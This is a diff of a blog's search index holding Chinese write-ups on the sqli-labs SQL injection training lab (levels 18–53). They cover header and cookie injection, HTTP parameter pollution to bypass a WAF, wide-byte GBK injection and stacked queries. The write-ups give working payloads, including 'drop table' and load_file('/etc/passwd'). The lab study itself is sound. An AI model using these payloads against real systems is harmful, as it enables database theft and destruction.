@@ -19,6 +19,98 @@
 ]]></content>
   </entry>
   <entry>
+    <title>less18-22</title>
+    <url>/2024/11/24/less18-22/</url>
+    <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
+<p><img src="/../images/1732457032265.png" alt="1732457032265" loading="lazy"></p>
+<p>如果错误登录则只会回显ip，显然不能进行之前的注入。</p>
+<p>我们查看源码（这里是一部分）</p>
+<p><img src="/../images/1732419575415.jpg" alt="1732419575415" loading="lazy"></p>
+<p>发现密码和账户都被17关的过滤给保护起来了。因此显然难以通过账户密码进行注入，但我们可以发现在查询成功处有给insert操作将uagent，与ip和uname插入括号里的三个字段中，我们便能想到通过修改uagent的值进行注入。</p>
+<p>要修改这个值我们需使用burp suite来进行抓包。</p>
+<p>并且修改user-agent的值。</p>
+<p><img src="/../images/1733489271913.jpg" alt="1733489271913" loading="lazy"></p>
+<p>这里的payload是<code>1&#39;,&#39;2&#39;,(select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t))#</code></p>
+<p>我们也可以用extractvalue,updatexml等函数的报错注入来简化payload。</p>
+<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>看关卡标题我们就可以知道这关和上关类似，不过这次我们需要修改的是Referer请求头，Referer指的是发起请求的上一页面也就是要从哪跳转到下一页面。</p>
+<p>我们构造的payload和上一关类似</p>
+<p><code>1&#39;,extractvalue(1,concat(0x7e,(select database()))))#</code></p>
+<p>因为源码中insert语句的变量少了。</p>
+<p><img src="/../images/1735725090372.jpg" alt="1735725090372" loading="lazy"></p>
+<p>注入成功。</p>
+<h1 id="less20-cookie"><a href="#less20-cookie" class="headerlink" title="less20(cookie)"></a>less20(cookie)</h1><p>首先尝试直接在username和password注入，无果，我们可以首先使用合法的账户登录，再由标题可知我们可以从cookie下手，既然页面能显示我的cookie，那么他一定在后台获取了我的cookie，又显示了我的账户密码，我们便可以猜测是通过检验cookie中的uname的值来显示不同的账号密码，我们查看源码。</p>
+<p><img src="/../images/1736838783987.jpg" alt="1736838783987" loading="lazy"></p>
+<p>我们便能知道注入点就是那个SQL语句。我们只要修改cookie的值便能进行注入。例如</p>
+<p><img src="/../images/1736839137733.jpg" alt="1736839137733" loading="lazy"></p>
+<p>我们便可以得到想要的值。</p>
+<h1 id="less21-cookie"><a href="#less21-cookie" class="headerlink" title="less21(cookie)"></a>less21(cookie)</h1><p>同上，不过是括号加单引号闭合，且是base64编码。</p>
+<h1 id="less22-cookie"><a href="#less22-cookie" class="headerlink" title="less22(cookie)"></a>less22(cookie)</h1><p>同20，但是双引号</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less28-less37</title>
+    <url>/2025/02/18/less28-less37/</url>
+    <content><![CDATA[<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>本关除了过滤注释符和空格，还将连续的<strong>union select</strong>给过滤了，我们可以使用双写绕过。</p>
+<h2 id="a0的问题"><a href="#a0的问题" class="headerlink" title="%a0的问题"></a>%a0的问题</h2><p>在别人的博客中我们发现有人使用%a0来代替空格是不会被过滤的，查询资料发现，是因为php版本不同在php5.2.17中，%a0是可以被解析成空格的，而php7中却不行。</p>
+<h1 id="less29-31"><a href="#less29-31" class="headerlink" title="less29-31"></a>less29-31</h1><p>这三关除了字符注入类型不同，其他方面几乎是一致的。</p>
+<p>源代码中出现了<code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code></p>
+<p>当这行代码执行时，它会从当前请求的 URL 中提取查询字符串，并将其存储在 <code>$qs</code> 变量中。这样你就可以在PHP脚本中使用这个查询字符串来获取请求参数，进行条件判断，或者执行其他逻辑。例如，在 URL <code>http://example.com/page.php?name=John&amp;age=30</code> 中，查询字符串是 <code>name=John&amp;age=30</code>。</p>
+<p>当输入正常参数时，网页返回正常信息，当输入单引号时，网页会被切换到hacked.php，应该是注入参数被WAF防御了。查看源码</p>
+<p>login.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>whitelist（）：</p>
+<p>是用于检查输入是否为纯数字，如果不是则跳转到 hacked.php</p>
+<p>java_implimentation（）：</p>
+<p>explode()把字符串打散为数组，例如$str&#x3D;”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] &#x3D;&gt; Hello ，[1] &#x3D;&gt; World)</p>
+<p>而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法：</p>
+<ul>
+<li>foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步</li>
+<li>foreach (array_expression as $key &#x3D;&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key。</li>
+</ul>
+<p>这两个自定义函数的效果就是将语句以“&amp;”为标识分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。</p>
+<p>对此我们可以使用 <strong>HTTP 参数污染攻击</strong></p>
+<p>原理为：</p>
+<p>截图等来自《MySQL注入天书：Less 29》</p>
+<p><img src="/../images/bc43cb9cc3e035dee1f34323fb0ae1c2.png" alt="bc43cb9cc3e035dee1f34323fb0ae1c2" loading="lazy"></p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>接下来是参数解析的问题。<br>问：index.php?id&#x3D;1&amp;id&#x3D;2，这时回显是id&#x3D;1还是id&#x3D;2呢？<br>答：apache (php) 解析最后一个参数，即回显id&#x3D;2；tomcat (jsp) 解析第<br>一个参数，即回显id&#x3D;1。</p>
+<p>大多数服务器对于参数解析：</p>
+<p><img src="/../images/09d8f68230d3ee833917982a92d043dd.png" alt="09d8f68230d3ee833917982a92d043dd" loading="lazy"></p>
+<p>这里有一个新问题。<br>问：index.jsp?id&#x3D;1&amp;id&#x3D;2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？<br>答：此处应该还是id&#x3D;2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
+<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id&#x3D;1&amp;id&#x3D;0 or 1&#x3D;1–+，tomcat 只检查第一个参数id&#x3D;1，而对第二个参数id&#x3D;0 or 1&#x3D;1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
+<p>该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
+<p>less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。</p>
+<h1 id="less32-33-35-36"><a href="#less32-33-35-36" class="headerlink" title="less32-33&amp;35&amp;36"></a>less32-33&amp;35&amp;36</h1><p>Less 32、33、35、36 都涉及到了对注入参数的转义，在一般情况下是不能注入的。但是当数据库使用 GBK 国标码或者其他编码时，可以使用恶意的参数把用于转义的斜杠“吃掉”变成其他字符，这就是所谓宽字节注入。使用宽字节注入绕过转义之后，其他的注入步骤和 Less 1 相似。</p>
+<p>查看源码发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>preg_quote(&#39;\\&#39;)</code>**：<code>preg_quote</code> 函数用于转义正则表达式中的特殊字符。由于反斜杠（<code>\</code>）在正则表达式中是特殊字符，所以需要先对其进行转义。这里传入的 <code>\\</code> 实际上表示一个反斜杠字符，因为在 PHP 字符串中，反斜杠本身是转义字符，所以需要用两个反斜杠来表示一个实际的反斜杠。<code>preg_quote(&#39;\\&#39;)</code> 的结果是 <code>\\</code>，表示匹配一个实际的反斜杠字符。</li>
+<li><strong><code>preg_replace</code><strong>：该函数用于执行正则表达式的搜索和替换操作。第一个参数是正则表达式模式，这里是 <code>/\\/</code>，表示匹配字符串中的反斜杠字符。第二个参数是替换字符串，<code>\\\\\\</code> 在 PHP 字符串中表示两个连续的反斜杠（<code>\\</code>），因为每个反斜杠都需要用两个反斜杠来转义。</strong>所以这行代码的作用是将字符串中的每个反斜杠替换为两个反斜杠，还在‘前加上反斜杠以转义，实现反斜杠的转义。</strong></li>
+</ul>
+<p>接着是这句代码：<br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br>这行代码的作用是设置客户端（即PHP脚本）与MySQL数据库服务器之间编码使用GBK国标码。</p>
+<p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。</p>
+<p>接下来就用联合查询注入</p>
+<p>less33和32差不多，less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，此处的过滤函数是 <strong>addslashes() 函数</strong>，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy Highlighter-hljsfunction <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$string</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>less35是数值型转义就没用了。</p>
+<p>而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。</p>
+<h1 id="less34-37"><a href="#less34-37" class="headerlink" title="less34&amp;37"></a>less34&amp;37</h1><p>less34是用 **addslashes() **过滤的</p>
+<p>less37是用**mysql_real_escape_string()**函数进行过滤</p>
+<p>这两个和之前的差不多不过是post传参。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>less1-7</title>
     <url>/2024/11/06/less1-7/</url>
     <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
@@ -124,81 +216,6 @@
       </tags>
   </entry>
   <entry>
-    <title>less28-less37</title>
-    <url>/2025/02/18/less28-less37/</url>
-    <content><![CDATA[<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>本关除了过滤注释符和空格，还将连续的<strong>union select</strong>给过滤了，我们可以使用双写绕过。</p>
-<h2 id="a0的问题"><a href="#a0的问题" class="headerlink" title="%a0的问题"></a>%a0的问题</h2><p>在别人的博客中我们发现有人使用%a0来代替空格是不会被过滤的，查询资料发现，是因为php版本不同在php5.2.17中，%a0是可以被解析成空格的，而php7中却不行。</p>
-<h1 id="less29-31"><a href="#less29-31" class="headerlink" title="less29-31"></a>less29-31</h1><p>这三关除了字符注入类型不同，其他方面几乎是一致的。</p>
-<p>源代码中出现了<code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code></p>
-<p>当这行代码执行时，它会从当前请求的 URL 中提取查询字符串，并将其存储在 <code>$qs</code> 变量中。这样你就可以在PHP脚本中使用这个查询字符串来获取请求参数，进行条件判断，或者执行其他逻辑。例如，在 URL <code>http://example.com/page.php?name=John&amp;age=30</code> 中，查询字符串是 <code>name=John&amp;age=30</code>。</p>
-<p>当输入正常参数时，网页返回正常信息，当输入单引号时，网页会被切换到hacked.php，应该是注入参数被WAF防御了。查看源码</p>
-<p>login.php：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>whitelist（）：</p>
-<p>是用于检查输入是否为纯数字，如果不是则跳转到 hacked.php</p>
-<p>java_implimentation（）：</p>
-<p>explode()把字符串打散为数组，例如$str&#x3D;”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] &#x3D;&gt; Hello ，[1] &#x3D;&gt; World)</p>
-<p>而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法：</p>
-<ul>
-<li>foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步</li>
-<li>foreach (array_expression as $key &#x3D;&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key。</li>
-</ul>
-<p>这两个自定义函数的效果就是将语句以“&amp;”为标识分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。</p>
-<p>对此我们可以使用 <strong>HTTP 参数污染攻击</strong></p>
-<p>原理为：</p>
-<p>截图等来自《MySQL注入天书：Less 29》</p>
-<p><img src="/../images/bc43cb9cc3e035dee1f34323fb0ae1c2.png" alt="bc43cb9cc3e035dee1f34323fb0ae1c2" loading="lazy"></p>
-<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
-<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
-<p>接下来是参数解析的问题。<br>问：index.php?id&#x3D;1&amp;id&#x3D;2，这时回显是id&#x3D;1还是id&#x3D;2呢？<br>答：apache (php) 解析最后一个参数，即回显id&#x3D;2；tomcat (jsp) 解析第<br>一个参数，即回显id&#x3D;1。</p>
-<p>大多数服务器对于参数解析：</p>
-<p><img src="/../images/09d8f68230d3ee833917982a92d043dd.png" alt="09d8f68230d3ee833917982a92d043dd" loading="lazy"></p>
-<p>这里有一个新问题。<br>问：index.jsp?id&#x3D;1&amp;id&#x3D;2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？<br>答：此处应该还是id&#x3D;2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
-<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
-<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id&#x3D;1&amp;id&#x3D;0 or 1&#x3D;1–+，tomcat 只检查第一个参数id&#x3D;1，而对第二个参数id&#x3D;0 or 1&#x3D;1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
-<p>该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
-<p>less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。</p>
-<h1 id="less32-33-35-36"><a href="#less32-33-35-36" class="headerlink" title="less32-33&amp;35&amp;36"></a>less32-33&amp;35&amp;36</h1><p>Less 32、33、35、36 都涉及到了对注入参数的转义，在一般情况下是不能注入的。但是当数据库使用 GBK 国标码或者其他编码时，可以使用恶意的参数把用于转义的斜杠“吃掉”变成其他字符，这就是所谓宽字节注入。使用宽字节注入绕过转义之后，其他的注入步骤和 Less 1 相似。</p>
-<p>查看源码发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>**<code>preg_quote(&#39;\\&#39;)</code>**：<code>preg_quote</code> 函数用于转义正则表达式中的特殊字符。由于反斜杠（<code>\</code>）在正则表达式中是特殊字符，所以需要先对其进行转义。这里传入的 <code>\\</code> 实际上表示一个反斜杠字符，因为在 PHP 字符串中，反斜杠本身是转义字符，所以需要用两个反斜杠来表示一个实际的反斜杠。<code>preg_quote(&#39;\\&#39;)</code> 的结果是 <code>\\</code>，表示匹配一个实际的反斜杠字符。</li>
-<li><strong><code>preg_replace</code><strong>：该函数用于执行正则表达式的搜索和替换操作。第一个参数是正则表达式模式，这里是 <code>/\\/</code>，表示匹配字符串中的反斜杠字符。第二个参数是替换字符串，<code>\\\\\\</code> 在 PHP 字符串中表示两个连续的反斜杠（<code>\\</code>），因为每个反斜杠都需要用两个反斜杠来转义。</strong>所以这行代码的作用是将字符串中的每个反斜杠替换为两个反斜杠，还在‘前加上反斜杠以转义，实现反斜杠的转义。</strong></li>
-</ul>
-<p>接着是这句代码：<br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br>这行代码的作用是设置客户端（即PHP脚本）与MySQL数据库服务器之间编码使用GBK国标码。</p>
-<p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。</p>
-<p>接下来就用联合查询注入</p>
-<p>less33和32差不多，less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，此处的过滤函数是 <strong>addslashes() 函数</strong>，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy Highlighter-hljsfunction <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$string</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>less35是数值型转义就没用了。</p>
-<p>而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。</p>
-<h1 id="less34-37"><a href="#less34-37" class="headerlink" title="less34&amp;37"></a>less34&amp;37</h1><p>less34是用 **addslashes() **过滤的</p>
-<p>less37是用**mysql_real_escape_string()**函数进行过滤</p>
-<p>这两个和之前的差不多不过是post传参。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less46-49</title>
-    <url>/2025/02/19/less46-49/</url>
-    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
-<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
-<p>把所有类型测试完发现是数值型注入。</p>
-<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
-<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
-<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
-<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>less42-45</title>
     <url>/2025/02/19/less42-45/</url>
     <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
@@ -208,6 +225,34 @@
 <h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和less42一样，不过是单引号和括号闭合。</p>
 <h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>和less42一样</p>
 <h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>和less43一样</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less38-41</title>
+    <url>/2025/02/18/less38-41/</url>
+    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
+<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
+<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
+<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
+<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
+<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
+<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less50-53</title>
+    <url>/2025/02/19/less50-53/</url>
+    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
+<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
+<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
+<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
+<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -244,51 +289,6 @@
 <h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
 <p>27a报错无回显，那么就用大小写过滤。</p>
 <p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less18-22</title>
-    <url>/2024/11/24/less18-22/</url>
-    <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
-<p><img src="/../images/1732457032265.png" alt="1732457032265" loading="lazy"></p>
-<p>如果错误登录则只会回显ip，显然不能进行之前的注入。</p>
-<p>我们查看源码（这里是一部分）</p>
-<p><img src="/../images/1732419575415.jpg" alt="1732419575415" loading="lazy"></p>
-<p>发现密码和账户都被17关的过滤给保护起来了。因此显然难以通过账户密码进行注入，但我们可以发现在查询成功处有给insert操作将uagent，与ip和uname插入括号里的三个字段中，我们便能想到通过修改uagent的值进行注入。</p>
-<p>要修改这个值我们需使用burp suite来进行抓包。</p>
-<p>并且修改user-agent的值。</p>
-<p><img src="/../images/1733489271913.jpg" alt="1733489271913" loading="lazy"></p>
-<p>这里的payload是<code>1&#39;,&#39;2&#39;,(select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t))#</code></p>
-<p>我们也可以用extractvalue,updatexml等函数的报错注入来简化payload。</p>
-<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>看关卡标题我们就可以知道这关和上关类似，不过这次我们需要修改的是Referer请求头，Referer指的是发起请求的上一页面也就是要从哪跳转到下一页面。</p>
-<p>我们构造的payload和上一关类似</p>
-<p><code>1&#39;,extractvalue(1,concat(0x7e,(select database()))))#</code></p>
-<p>因为源码中insert语句的变量少了。</p>
-<p><img src="/../images/1735725090372.jpg" alt="1735725090372" loading="lazy"></p>
-<p>注入成功。</p>
